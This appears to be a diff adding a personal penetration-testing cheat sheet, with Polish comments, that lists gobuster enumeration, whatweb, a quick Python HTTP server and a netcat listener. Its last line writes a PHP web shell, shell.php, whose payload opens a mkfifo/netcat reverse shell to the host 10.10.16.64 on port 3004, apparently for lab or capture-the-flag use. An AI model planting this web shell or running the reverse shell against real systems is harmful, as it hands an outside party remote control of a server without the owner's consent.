@@ -1,0 +1,6 @@
+gobuster vhost --append-domain -w <wordlist> -u <url> #do szukania subdomen
+sudo python -m http.server 8080 #szybki serverek http
+gobuster dir -u <url> -w <wordlist> #directory enum
+whatweb <ip> #info o stronie web
+nc -lvno <port> #listener do reverse shell
+echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.64 3004 >/tmp/f"); ?>' | tee -a shell.php # tworzy reverse shell.php
